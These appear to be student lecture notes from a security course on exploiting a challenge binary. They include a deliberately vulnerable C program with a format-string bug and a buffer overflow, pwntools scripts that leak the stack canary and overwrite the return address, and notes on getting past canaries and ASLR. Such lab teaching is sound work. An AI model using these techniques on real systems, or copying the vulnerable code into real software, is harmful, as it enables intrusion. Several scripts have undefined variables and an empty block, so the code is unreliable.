```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>

#define INPUT_SIZE 8

//win function!!
void playaudio() {
	int fd;
	char buffer[64];

	if((fd = open("./flag.txt", O_RDONLY)) < 0){
		perror("open failed!\n");
		exit(1);
	}

	int c = read(fd, buffer, 64);
	write(STDOUT_FILENO, buffer, c);

	exit(0);
}

void calibrate(){
	char buffer[{{buffsize}}];

	fgets(buffer, INPUT_SIZE, stdin);
	printf(buffer); //format string: can cause information leak
	read(STDIN_FILENO, buffer, 64);
}

int main(int argc, char **argv){
	setbuf(stdout, NULL);
	setbuf(stdin, NULL);
	setbuf(stderr, NULL);

	printf("%p\n", &playaudio);
	calibrate();
}
```
**connect to server to run the binary**
```bash
nc cs4401shell.walls.ninja 50203
```
WHat does this mean?
- reduces the information we have. 
- Can't create env variables
- cant run in gdb


How do we hijack the control flow?
- `read()`: reads until it hits EOF or the number of bytes specified
	- doesn't stop at newline characters
- Creates an issue if the size of the buffer is less than the number of bytes read

### Format strings
- when passed into printf, can be used to print out data
- %x can print out hex data, on the stac

dollar-sign notation
- can be used to specify order
- 

`format0.pyt`
```python
from pwn import *
import os
  

elf = ELF('./format0-64')
context.binary=elf
context.log_level = 'debug'
context.arch = 'amd64'

debug_mode=True

#leak info on the stack
def leak(param_num):
	p = process(elf)
	p.recvline()
	p.sendline(f"%{param_num}$p")
	leak_raw = p.recvline().strip()
	leak_val = int(leak_raw, 16)
	p.sendline(flat({16:0xdeadbeef}))
	p.wait()
	return leak_val

offset = 59

dbg = cyclic(300)
#print(cyclic_find("raaa"))


if debug_mode == True:
	


for param_num in range(1, 16):
	try:
		with context.silent:
			leak_value = leak(param_num)
		log.info("Value leaked at param {param_num}: {hex(leak_value)}")
		pass
	except Exception as e:
		log.info("Failed to leak param number {param_num}")

p = gdb.debug(elf, gdbscript = '''
		b *main + 125
		shell tmux select-layout main-vertical
		shell tmux swap-pane -U
	''')

p.sendline(b'a')
p.sendline(flat({16:0xdeadbeef})) #replace with the return addr of the win function

p.recvall()
p.wait()
	
```

## Summary
- took advantage of a buffer overflow without access to running the source in gdb
- allows us to leak canaries

## Hardmode: Stack Canaries and ASLR
1. Leak value at 11th paramter (`%11$p`)
2. Store that in a variable to put in the exploit string
3. Proposed memory Leak string: `"%11$p %13$p"`
	1. Not enough space
```python
def leak(param_num):
	p = remote('cs4401shell.walls.ninja', 9898)
	p.recvline()
	p.sendline(f"%{param_num}$p")
	leak_raw = p.recvline().strip()
	leak_val = int(leak_raw, 16)
	p.sendline(b'a')
	p.recvall()
	p.wait()
	return leak_val

#param numbers for memory leaks
buff_start = 6
canary = 11
ret_addr = 13

win_addr = stoi(p.recvline())
log.info(f"Win Address: {hex(win_addr)}")

p.sendline(f"%{canary_param}$p".encode())
canary = stoi(p.recvline())
log.info(f"Canary: {hex(canary)}")

exploit_flat = flat({
		canary_offset:canary,
		ret_offset:win_addr+5
})

assert b'\n' not in exploit_str
```
only a little more complicated 


#### What if we get rid of the first info leak
`printf("%p\n", &playaudio)`
- Theres guessing involved, but you don't have to guess the entire address space
- Hangman Solution: See Stack Canary Notes
- We don't have to overwrite the whole return address, we only have to overwrite the address that we want!
- Only overwrite the middle 2.5 bytes
- ${2}^{12}$ possibilities


- Stack Canary: Will look like a hex representation of ascii

Add new instructions to prologue
- use of fs register
- use of `_stack_chk_fail` function
	- calls if comparison between known canary value and the value in that spot of the stack fails
- Where is the Stack Canary
	- `mov QWORD PTR [rbp-0x8], rax`
	- one byte before `rbp`
- useful because lightweight


**Bypassing Canary**
- leak memory to find the canary!
- fork(): make a fork of the process, will have the same stack canary
	- keep forking and guessing the canary until you get the correct canary
	- ex: Apache webserver forks off a child for a web request
	- Guessing Canaries without memory leak
		- Like Hangman
		- Overwrite each byte individually, so part of the canary remains the same, allowing you to guess one byte at a time
		- More efficient than brute-force guessing for each possible combination
- Stack Canaries are only inserted if the buffer is > 8bytes

### ASLR
- Adress Space Layout Randomization
- Course grained: only changes where the different sections start
	- ex: moving books in a bookshelf
- Doesn't change the order of anything inside the regions
- Fine-Grained: shuffle things inside the different sections
- What makes a good guess for a return address
	- first byte is the same, last few bytes are the same
	- only about three bytes that can vary


